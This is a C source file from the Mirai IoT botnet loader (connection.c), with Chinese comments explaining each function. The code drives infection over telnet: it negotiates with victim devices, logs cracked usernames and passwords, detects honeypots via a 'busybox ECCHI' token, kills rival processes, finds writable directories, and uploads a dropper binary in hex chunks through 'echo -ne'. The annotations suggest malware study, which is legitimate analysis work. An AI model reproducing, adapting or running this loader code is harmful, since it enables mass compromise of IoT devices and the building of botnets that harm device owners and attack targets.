#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <pthread.h>
#include "headers/includes.h"
#include "headers/connection.h"
#include "headers/server.h"
#include "headers/binary.h"
#include "headers/util.h"
//判断loader和感染设备telnet交互过程中的状态信息

// 对应的telnet连接状态为枚举类型【详见connection.h】
// enum {
//     TELNET_CLOSED,          // 0
//     TELNET_CONNECTING,      // 1
//     TELNET_READ_IACS,       // 2
//     TELNET_USER_PROMPT,     // 3
//     TELNET_PASS_PROMPT,     // 4
//     ......
//     TELNET_RUN_BINARY,      // 18
//     TELNET_CLEANUP          // 19
// } state_telnet;

//初始化connection结构体，初始化之后状态变为TELNET_CONNECTING
void connection_open(struct connection *conn)   
{
    pthread_mutex_lock(&conn->lock);

    conn->rdbuf_pos = 0;
    conn->last_recv = time(NULL);
    conn->timeout = 10;
    conn->echo_load_pos = 0;    //echo bianry已经load到哪里了，初始为0
    conn->state_telnet = TELNET_CONNECTING;
    conn->success = FALSE;
    conn->open = TRUE;  //表示已经要打开connection连接【close时，该项置为false】
    conn->bin = NULL;
    conn->echo_load_pos = 0;
#ifdef DEBUG
    printf("[FD%d] Called connection_open\n", conn->fd);
#endif

    pthread_mutex_unlock(&conn->lock);
}

//
void connection_close(struct connection *conn)
{
    pthread_mutex_lock(&conn->lock);

    if (conn->open)
    {
#ifdef DEBUG
        printf("[FD%d] Shut down connection\n", conn->fd);
#endif
        memset(conn->output_buffer.data, 0, sizeof(conn->output_buffer.data));
        conn->output_buffer.deadline = 0;
        conn->last_recv = 0;
        conn->open = FALSE;
        conn->retry_bin = FALSE;
        conn->ctrlc_retry = FALSE;
        memset(conn->rdbuf, 0, sizeof(conn->rdbuf));
        conn->rdbuf_pos = 0;

        if (conn->srv == NULL)
        {
            printf("srv == NULL\n");
            return;
        }
        //在真正地关闭fd之前
        if (conn->success)  //如果之前的本次连接成功。
        {   //在srv中记录的成功连接数+1
            ATOMIC_INC(&conn->srv->total_successes);    //+1的原子操作
            //在stderr中打印连接成功的OK|ip:port user:pw arch信息
            fprintf(stderr, "OK|%d.%d.%d.%d:%d %s:%s %s\n",
                conn->info.addr & 0xff, (conn->info.addr >> 8) & 0xff, (conn->info.addr >> 16) & 0xff, (conn->info.addr >> 24) & 0xff,
                ntohs(conn->info.port),
                conn->info.user, conn->info.pass, conn->info.arch);
        }
        else //如果之前的本次连接失败了。
        {   //在srv中记录的失败连接数+1
            ATOMIC_INC(&conn->srv->total_failures); 
             //在stderr中打印连接失败的ERR|ip:port user:pw arch|state信息
            fprintf(stderr, "ERR|%d.%d.%d.%d:%d %s:%s %s|%d\n",
                conn->info.addr & 0xff, (conn->info.addr >> 8) & 0xff, (conn->info.addr >> 16) & 0xff, (conn->info.addr >> 24) & 0xff,
                ntohs(conn->info.port),
                conn->info.user, conn->info.pass, conn->info.arch,
                conn->state_telnet);
        }
    }
    conn->state_telnet = TELNET_CLOSED;     //修改状态

    if (conn->fd != -1)
    {
        close(conn->fd);    //真实地close了
        conn->fd = -1;
        ATOMIC_DEC(&conn->srv->curr_open);  //svr中当前开启数--
    }

    pthread_mutex_unlock(&conn->lock);
}

//进行IAC协商阶段，完成协商后才正式开始通信。完成TELNET_READ_IACS阶段
//返回消耗了多少rdbuf大小。
//参看scanner.c模块中的consume_iacs函数。
//http://www.tsnien.idv.tw/Internet_WebBook/chap11/11-4%20Telnet%20%E9%80%9A%E8%A8%8A%E5%8D%94%E5%AE%9A.html
int connection_consume_iacs(struct connection *conn)
{
    int consumed = 0;
    uint8_t *ptr = conn->rdbuf; //这个连接收到的信息

    while (consumed < conn->rdbuf_pos)
    {
        int i;

        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)  //IAC命令
        {
            if (!can_consume(conn, ptr, 1))
                break;
            if (ptr[1] == 0xff)
            { 
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd)    //DO
            {
                uint8_t tmp1[3] = {255, 251, 31};   //IAC WILL NAWS
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};  //IAC SB NAWS 80 24 IAC SE【给出终端窗口大小为width*height=80*24】

                if (!can_consume(conn, ptr, 2)) 
                    break;
                if (ptr[2] != 31)   //NAWS
                    goto iac_wont;
 
                ptr += 3;
                consumed += 3;

                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
                iac_wont:   //如果要mirai选择配置，除了窗口大小，一律回答WONT; 如果对方自己选配置等，那mirai一律do

                if (!can_consume(conn, ptr, 2)) 
                    break;

                for (i = 0; i < 3; i++)     //遍历前三个字符，替换成为回复命令
                {
                    if (ptr[i] == 0xfd)          //do
                        ptr[i] = 0xfc;  // WONT
                    else if (ptr[i] == 0xfb)    //will
                        ptr[i] = 0xfd;  //DO
                }

                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

//判断是否收到login提示信息
int connection_consume_login_prompt(struct connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos; i >= 0; i--)  //倒着回溯rdbuf，查看rdbuf中是否有登录提示符
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
#ifdef DEBUG
            printf("matched login prompt at %d, \"%c\", \"%s\"\n", i, conn->rdbuf[i], conn->rdbuf);
#endif
            prompt_ending = i;  //记录提示符结束位置
            break;
        }
    }

    if (prompt_ending == -1)    //没找到提示符
    {
        int tmp;

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)  //找enter和ogin字符串
            prompt_ending = tmp;
        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)    //如果都没有找到，说明login阶段未达到，未收到登录信息
        return 0;
    else
        return prompt_ending;   //否则返回登录信息提示符之后的位置，可以从这之后解析rdbuf
}

//判断是否收到password提示信息
int connection_consume_password_prompt(struct connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos; i >= 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
#ifdef DEBUG
            printf("matched password prompt at %d, \"%c\", \"%s\"\n", i, conn->rdbuf[i], conn->rdbuf);
#endif
            prompt_ending = i;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

//判断是否收到shell提示符
int connection_consume_prompt(struct connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos; i >= 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
#ifdef DEBUG
            printf("matched any prompt at %d, \"%c\", \"%s\"\n", i, conn->rdbuf[i], conn->rdbuf);
#endif
            prompt_ending = i;
            break;
        }
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

//判断是否收到ECCHI: applet not found。【busybox在收到ECCHI命令的时候，如果不存在这个命令，应该会回复ECCHI: applet not found】
//攻击者将运行几个命令以确保它们未连接到路由器或诸如Cowrie之类的普通蜜罐
//如busybox ECCHI
//这个命令有两个作用
//1.检测普通蜜罐和其他不相干的系统，只有具备busybox的系统【基本是就是iot设备或者IOT蜜罐】才能回复ECCHI: applet not found
//2.用于确保攻击者执行的上一个命令已经完成了，回显shell了，重新输入ECCHI命令得到响应。
//【Later, the attacker adds "/bin/busybox ECCHI" at the end of each line, following the actual command to be executed.】
/*
例如：
util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
//用在其它命令后作为一种标记，可判断之前的命令是否执行
#define TOKEN_QUERY     "/bin/busybox ECCHI"
//如果回包中有如下提示，则之前的命令执行了  
#define TOKEN_RESPONSE  "ECCHI: applet not found"
*/
int connection_consume_verify_login(struct connection *conn)
{
    int prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

//根据ps命令返回结果kill掉某些特殊进程
int connection_consume_psoutput(struct connection *conn)
{
    int offset;
    char *start = conn->rdbuf;
    int i, ii;

    offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));
    //在ps命令之后，执行ECCHI【确保之前的命令已经执行完成】，得到的回显信息为ECCHI: applet not found。以此为结束界限，此前的回显为ps命令的结果
    for (i = 0; i < (offset == -1 ? conn->rdbuf_pos : offset); i++) //遍历ps命令回显的结果
    {
        if (conn->rdbuf[i] == '\r')
            conn->rdbuf[i] = 0;     // 将\r替换为0
        else if (conn->rdbuf[i] == '\n')    //如果没找到换行符就不停i++
        {
            uint8_t option_on = 0;
            BOOL last_character_was_space = FALSE;
            char *pid_str = NULL, *proc_name = NULL;

            conn->rdbuf[i] = 0; //将换行符替换为\0
            for (ii = 0; ii < ((char *)&conn->rdbuf[i] - start); ii++)  //解析这一行的结果信息
            {
                if (start[ii] == ' ' || start[ii] == '\t' || start[ii] == 0)
                {
                    if (option_on > 0 && !last_character_was_space)
                        option_on++;    //option_on标识现在解析到第几个列了
                    start[ii] = 0;  //特殊字符更换为0【也就是\0，便于截断一个个列，只需要记录开头为&start[ii]】
                    last_character_was_space = TRUE;    //标识当前解析的是不是空格类的字符
                }
                else
                {
                    if (option_on == 0)
                    {
                        pid_str = &start[ii];   //解析到的非空格字符串的起始位置&start[ii]【此时解析的是pid】
                        option_on++;
                    }
                    else if (option_on >= 3 && option_on <= 5 && last_character_was_space)  //在index=3~5列为cmd命令【运行程序和参数的部分】，且上一个解析到字符是空格，那么这时就是这列的开头
                    {
                        proc_name = &start[ii]; //此时解析到的是procname
                    }
                    last_character_was_space = FALSE;
                }
            }   //解析完成一行ps命令的结果

            if (pid_str != NULL && proc_name != NULL)   
            {
                int pid = atoi(pid_str);
                int len_proc_name = strlen(proc_name);

#ifdef DEBUG
                printf("pid: %d, proc_name: %s\n", pid, proc_name);
#endif
                //pid为1的是真实的init进程，mirai会把名称中包含init字符的进程kill掉【除了真实的init进程】
                if (pid != 1 && (strcmp(proc_name, "init") == 0 || strcmp(proc_name, "[init]") == 0)) // Kill the second init
                    util_sockprintf(conn->fd, "/bin/busybox kill -9 %d\r\n", pid);  //从victim发送数据（send函数）： kill -9命令，删除init进程。
                else if (pid > 400) //如果进程号大于400
                {
                    int num_count = 0;
                    int num_alphas = 0;

                    for (ii = 0; ii < len_proc_name; ii++)  //计算进程名中字符和数字的个数
                    {
                        if (proc_name[ii] >= '0' && proc_name[ii] <= '9')
                            num_count++;
                        else if ((proc_name[ii] >= 'a' && proc_name[ii] <= 'z') || (proc_name[ii] >= 'A' && proc_name[ii] <= 'Z'))
                        {
                            num_alphas++;
                            break;
                        }
                    }

                    if (num_alphas == 0 && num_count > 0)   //如果没有字符，但是有数字，认为这个是个可疑进程，kill掉
                    {
                        //util_sockprintf(conn->fd, "/bin/busybox cat /proc/%d/environ", pid); // lol
#ifdef DEBUG
                        printf("Killing suspicious process (pid=%d, name=%s)\n", pid, proc_name);
#endif
                        util_sockprintf(conn->fd, "/bin/busybox kill -9 %d\r\n", pid);
                    }
                }
            }

            start = conn->rdbuf + i + 1;    //更新start，已经解析结果的就不管了。i为该行结束的\n字符，+1从下一行开始解析
        }
    }

    if (offset == -1)   //如果没有收到ECCHI: applet not found信息，说明前面的ps命令没有执行完。但是这里只里关注的是ps命令的结果，因此既然没有就把之前无用的回显直接覆盖掉。
    {
        if (conn->rdbuf_pos > 7168) //溢出了
        {
            memmove(conn->rdbuf, conn->rdbuf + 6144, conn->rdbuf_pos - 6144);   //覆盖掉6144个字符
            conn->rdbuf_pos -= 6144;
        }
        return 0;
    }
    else
    { 
        for (i = 0; i < conn->rdbuf_pos; i++)
        {
            if (conn->rdbuf[i] == 0)    //之前的特殊字符被改为0用于截断各个列，现在改为空格
                conn->rdbuf[i] = ' ';
        }
        return offset;  //解析到的最后位置，即ECCHI: applet not found信息解析完
    }
}

//cat /proc/mounts，查看挂在了哪些文件系统
int connection_consume_mounts(struct connection *conn)
{
    char linebuf[256];
    int linebuf_pos = 0, num_whitespaces = 0;
    int i, prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (prompt_ending == -1)    //上一个命令还没有执行完
        return 0;

    for (i = 0; i < prompt_ending; i++)
    {

        if (linebuf_pos == sizeof(linebuf) - 1)
        {
            // why are we here
            break;
        }

        if (conn->rdbuf[i] == '\n') //完成一行的解析了
        {
            char *path, *mnt_info;

            linebuf[linebuf_pos++] = 0; //\0，截断这一行

            //以空格为分隔符，分割linebuf
            strtok(linebuf, " "); // Skip name of partition
            if ((path = strtok(NULL, " ")) == NULL)  //第二列，挂载的路径
                goto dirs_end_line;
            if (strtok(NULL, " ") == NULL) // Skip type of partition
                goto dirs_end_line;
            if ((mnt_info = strtok(NULL, " ")) == NULL) //挂载信息，eg：rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000
                goto dirs_end_line;

            if (path[strlen(path) - 1] == '/')
                path[strlen(path) - 1] = 0;

            if (util_memsearch(mnt_info, strlen(mnt_info), "rw", 2) != -1)
            {
                util_sockprintf(conn->fd, "/bin/busybox echo -e '%s%s' > %s/.nippon; /bin/busybox cat %s/.nippon; /bin/busybox rm %s/.nippon\r\n",
                                VERIFY_STRING_HEX, path, path, path, path, path);   //把所有可读写的文件系统的名称写入./path/nippon中，cat这个文件【会被传回到mirai】，然后再删除这个文件
            }//VERIFY_STRING_HEX = “kami”
        
            dirs_end_line:
            linebuf_pos = 0;
        }
        else if (conn->rdbuf[i] == ' ' || conn->rdbuf[i] == '\t')   //如果有多个空格或者\t，那么就只记录一个空格。其他就不存储了。
        {
            if (num_whitespaces++ == 0)         //  "a         b" => "a b"
                linebuf[linebuf_pos++] = conn->rdbuf[i];
        }
        else if (conn->rdbuf[i] != '\r')    //非\t \n space的普通字符就会直接赋值到linebuf中
        {
            num_whitespaces = 0;    //num_whitespaces用于记录连续的空格数目，现在是普通字符，直接清空。
            linebuf[linebuf_pos++] = conn->rdbuf[i];
        }
    }

    util_sockprintf(conn->fd, "/bin/busybox echo -e '%s/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon\r\n",
                                VERIFY_STRING_HEX); //"kami"。 kami

    util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");  //再发送一个ECCHI，以判断命令是否结束
    return prompt_ending;
}


int connection_consume_written_dirs(struct connection *conn)
{
    int end_pos, i, offset, total_offset = 0;
    BOOL found_writeable = FALSE;

    if ((end_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE))) == -1)
        return 0;

    while (TRUE)
    {
        char *pch;
        int pch_len;

        offset = util_memsearch(conn->rdbuf + total_offset, end_pos - total_offset, VERIFY_STRING_CHECK, strlen(VERIFY_STRING_CHECK));
        if (offset == -1)
            break;
        total_offset += offset;

        pch = strtok(conn->rdbuf + total_offset, "\n");
        if (pch == NULL)
            continue;
        pch_len = strlen(pch);

        if (pch[pch_len - 1] == '\r')
            pch[pch_len - 1] = 0;

        util_sockprintf(conn->fd, "rm %s/.t; rm %s/.sh; rm %s/.human\r\n", pch, pch, pch);
        if (!found_writeable)
        {
            if (pch_len < 31)
            {
                strcpy(conn->info.writedir, pch);
                found_writeable = TRUE;
            }
            else
                connection_close(conn);
        }
    }

    return end_pos;
}

//从rdbuf中消耗ECCHI: applet not found信息，返回消耗后的rdbuf index
int connection_consume_copy_op(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;
    return offset;
}

//判断系统的体系架构，即解析ELF文件头
//是从回显的信息中读取binary的信息
//之前应该有echo binary的操作。
int connection_consume_arch(struct connection *conn)
{
    if (!conn->info.has_arch)   //若telnet_info中没有arch的信息
    {
        struct elf_hdr *ehdr;
        int elf_start_pos;

        if ((elf_start_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ELF", 3)) == -1) //搜索ELF字符串
            return 0;
        //此时就是回到整个binary文件的开头位置
        elf_start_pos -= 4; // Go back ELF

        ehdr = (struct elf_hdr *)(conn->rdbuf + elf_start_pos); //elf头部
        conn->info.has_arch = TRUE;

        switch (ehdr->e_ident[EI_DATA]) //目标文件中的数据编码格式：大端/小端
        {
            case EE_NONE:
                return 0;
            case EE_BIG:
#ifdef LOADER_LITTLE_ENDIAN
                ehdr->e_machine = htons(ehdr->e_machine);   //根据大端或小端来决定如何解析e_machine字段，这个字段表征elf文件适用的体系结构
#endif
                break;
            case EE_LITTLE:
#ifdef LOADER_BIG_ENDIAN
                ehdr->e_machine = htons(ehdr->e_machine);
#endif
                break;
        }

        /* arm mpsl spc m68k ppc x86 mips sh4 */ 
        if (ehdr->e_machine == EM_ARM || ehdr->e_machine == EM_AARCH64)
            strcpy(conn->info.arch, "arm");
        else if (ehdr->e_machine == EM_MIPS || ehdr->e_machine == EM_MIPS_RS3_LE)
        {
            if (ehdr->e_ident[EI_DATA] == EE_LITTLE)    //mips还根据大小端来决定不同
                strcpy(conn->info.arch, "mpsl");
            else
                strcpy(conn->info.arch, "mips");
        }
        else if (ehdr->e_machine == EM_386 || ehdr->e_machine == EM_486 || ehdr->e_machine == EM_860 || ehdr->e_machine == EM_X86_64)
            strcpy(conn->info.arch, "x86");
        else if (ehdr->e_machine == EM_SPARC || ehdr->e_machine == EM_SPARC32PLUS || ehdr->e_machine == EM_SPARCV9)
            strcpy(conn->info.arch, "spc");
        else if (ehdr->e_machine == EM_68K || ehdr->e_machine == EM_88K)
            strcpy(conn->info.arch, "m68k");
        else if (ehdr->e_machine == EM_PPC || ehdr->e_machine == EM_PPC64)
            strcpy(conn->info.arch, "ppc");
        else if (ehdr->e_machine == EM_SH)
            strcpy(conn->info.arch, "sh4");
        else    //如果这个victim的架构不是mirai支持的架构，那么直接close。不攻击【没有对应的payload】
        {
            conn->info.arch[0] = 0; //没有期望的架构则为0
            connection_close(conn);
        }
    }
    else    //如果已经有arch信息了，那么直接解析到末尾，rdbuf中无用信息丢弃掉
    {
        int offset;

        if ((offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE))) != -1)
            return offset;
        if (conn->rdbuf_pos > 7168)
        {
            // Hack drain buffer
            memmove(conn->rdbuf, conn->rdbuf + 6144, conn->rdbuf_pos - 6144);
            conn->rdbuf_pos -= 6144;
        }
    }

    return 0;
}

//在echo binary之后的binary信息中查找arm字样。如果能找到ARMv7或者ARMv6，架构更新为arm7
int connection_consume_arm_subtype(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;

    if (util_memsearch(conn->rdbuf, offset, "ARMv7", 5) != -1 || util_memsearch(conn->rdbuf, offset, "ARMv6", 5) != -1)
    {
#ifdef DEBUG
        printf("[FD%d] Arch has ARMv7!\n", conn->fd);
#endif
        strcpy(conn->info.arch, "arm7");
    }

    return offset;
}

//判断采用哪种方式上传payload（wget、tftp、echo）
//执行wget、tftp、echo命令，判断busybox是否提示 applet not found，如果没有提示找不到，那么就说明可以使用这种方式，更新conn->info.upload_method
//wget优先于tftp和echo
int connection_consume_upload_methods(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;

    if (util_memsearch(conn->rdbuf, offset, "wget: applet not found", 22) == -1)    //尝试wget，没有找到”wget: applet not found“，说明wget可用
        conn->info.upload_method = UPLOAD_WGET;
    else if (util_memsearch(conn->rdbuf, offset, "tftp: applet not found", 22) == -1)
        conn->info.upload_method = UPLOAD_TFTP;
    else
        conn->info.upload_method = UPLOAD_ECHO;

    return offset;
}

//以echo的方式上传binary【需要多次多次调用，直到conn->echo_load_pos == conn->bin->hex_payloads_len】
int connection_upload_echo(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;

    if (conn->bin == NULL)  //在server.c中会根据arch，获得conn->bin。如果找不到对应arch，就直接close connection
    {
        connection_close(conn); 
        return 0;
    }
    //在conn->echo_load_pos的时候初始为0
    if (conn->echo_load_pos == conn->bin->hex_payloads_len) //已经load完毕。达到bin的结尾了
        return offset;  //传完了，返回offset

    //通过echo >来创建文件【conn->echo_load_pos为0时，还未load过任何字节】，通过echo >>来在文件中追加信息，-e 开启转义，
    //每次echo完，都键入busybox ECCHI命令，标识此时echo完成、
    //创建的payload文件名称为upnp【即loader/bins/dlr.xxx】
    // echo -ne 'hex' [>]> path/FN_DROPPER
    util_sockprintf(conn->fd, "echo -ne '%s' %s " FN_DROPPER "; " TOKEN_QUERY "\r\n",
                    conn->bin->hex_payloads[conn->echo_load_pos], (conn->echo_load_pos == 0) ? ">" : ">>");
    conn->echo_load_pos++;  //记录已经load的128字节单元

    // Hack drain
    memmove(conn->rdbuf, conn->rdbuf + offset, conn->rdbuf_pos - offset);   //覆盖/丢弃之前的回显，避免之前命令附带的ECCHI: applet not found影响下次判断
    conn->rdbuf_pos -= offset;

    return 0;   //还有东西可传返回0
}


int connection_upload_wget(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;

    return offset;
}

int connection_upload_tftp(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;

    if (util_memsearch(conn->rdbuf, offset, "Permission denied", 17) != -1)
        return offset * -1;

    if (util_memsearch(conn->rdbuf, offset, "timeout", 7) != -1)
        return offset * -1;

    if (util_memsearch(conn->rdbuf, offset, "illegal option", 14) != -1)
        return offset * -1;

    return offset;
}

//判断上传到iot的payload是否成功运行
int connection_verify_payload(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, EXEC_RESPONSE, strlen(EXEC_RESPONSE));

    if (offset == -1)
        return 0;

    if (util_memsearch(conn->rdbuf, offset, "listening tun0", 14) == -1)
        return offset;
    else
        return 255 + offset;
}

//查找一个ECCHI: applet not found，找到返回结尾的offset
int connection_consume_cleanup(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;
    return offset;
}

//从ptr指针开始，可以消耗amount个字节【小于可读缓冲区rdbuf的结尾】
static BOOL can_consume(struct connection *conn, uint8_t *ptr, int amount)
{
    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;

    return ptr + amount < end;
}
